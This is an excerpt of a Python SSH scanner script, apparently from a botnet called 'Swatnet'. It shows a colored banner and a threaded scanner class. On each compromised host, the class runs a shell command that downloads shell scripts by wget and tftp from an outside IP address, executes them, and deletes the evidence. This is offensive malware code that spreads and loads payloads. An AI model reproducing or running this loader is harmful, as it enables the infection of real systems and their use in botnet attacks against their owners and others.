...
print "\x1b[0;31m*  Welcome To Swatnet  *\x1b[0m"
print "\x1b[0;31m*      Scanner on!!     *\x1b[0m"
print "\x1b[0;31m*************************\x1b[0m"
print "\x1b[0;36mMade By Exploit\x1b[0m"
...
class sshscanner(threading.Thread):
    ...
    def run(self):
        while 1:
			...
			ssh.exec_command("cd /tmp || cd /var || cd /dev; wget  http://185.237.96.86/sensi.sh; tftp -r tftp2.sh -g 185.237.96.86; sh sensi.sh; sh tftp2.sh; rm -rf *.sh")
